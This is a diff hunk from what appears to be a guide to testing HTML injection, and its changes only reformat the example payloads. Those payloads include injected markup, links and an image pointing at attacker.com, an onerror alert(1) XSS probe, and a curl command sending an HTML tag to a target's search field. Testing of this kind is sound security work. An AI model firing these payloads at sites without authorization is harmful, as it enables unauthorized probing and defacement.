@@ -13,18 +13,20 @@ Test with simple HTML tags:
 <!-- Structural elements -->
 <div style="background:red;color:white;padding:10px">Injected DIV</div>
 <p>Injected paragraph</p>
-<br><br><br>Line breaks
+<br /><br /><br />Line breaks
 
 <!-- Links -->
 <a href="http://attacker.com">Click Here</a>
 <a href="http://attacker.com">Legitimate Link</a>
 
 <!-- Images -->
-<img src="http://attacker.com/image.png">
-<img src="x" onerror="alert(1)">  <!-- XSS attempt -->
+<img src="http://attacker.com/image.png" />
+<img src="x" onerror="alert(1)" />
+<!-- XSS attempt -->
 ```
 
 Testing workflow:
+
 ```bash
 # Test basic injection
 curl "http://target.com/search?q=<h1>Test</h1>"
